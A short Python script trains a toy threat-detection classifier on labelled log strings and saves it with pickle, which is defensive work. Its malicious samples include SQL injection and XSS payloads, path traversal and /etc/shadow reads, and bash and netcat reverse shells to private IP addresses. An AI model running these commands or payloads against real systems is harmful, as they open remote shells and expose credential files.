import pickle
import os
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_extraction.text import TfidfVectorizer

# Training data - malicious (1) vs normal (0)
training_data = [
    # Malicious logs
    ("SELECT * FROM users WHERE '1'='1'", 1),
    ("'; DROP TABLE users--", 1),
    ("<script>alert('XSS')</script>", 1),
    ("../../../etc/passwd", 1),
    ("Failed password for invalid user", 1),
    ("; cat /etc/shadow", 1),
    ("' OR 1=1 --", 1),
    ("<img src=x onerror=alert(1)>", 1),
    ("bash -i >& /dev/tcp/10.0.0.1/8080", 1),
    ("| nc -e /bin/sh 192.168.1.1 4444", 1),
    
    # Normal logs
    ("User logged in successfully", 0),
    ("GET /index.html HTTP/1.1 200", 0),
    ("Service started successfully", 0),
    ("Database connection established", 0),
    ("User session created", 0),
    ("Configuration loaded", 0),
    ("POST /api/data 200 OK", 0),
    ("File uploaded: document.pdf", 0),
    ("Email sent successfully", 0),
    ("Cache cleared", 0),
]

# Create model
X_text = [item[0] for item in training_data]
y = [item[1] for item in training_data]

vectorizer = TfidfVectorizer(max_features=100, ngram_range=(1, 2))
X = vectorizer.fit_transform(X_text)

model = RandomForestClassifier(n_estimators=50, random_state=42)
model.fit(X, y)

# Save model
os.makedirs('ml_models', exist_ok=True)
with open('ml_models/threat_detection_model.pkl', 'wb') as f:
    pickle.dump({'model': model, 'vectorizer': vectorizer}, f)

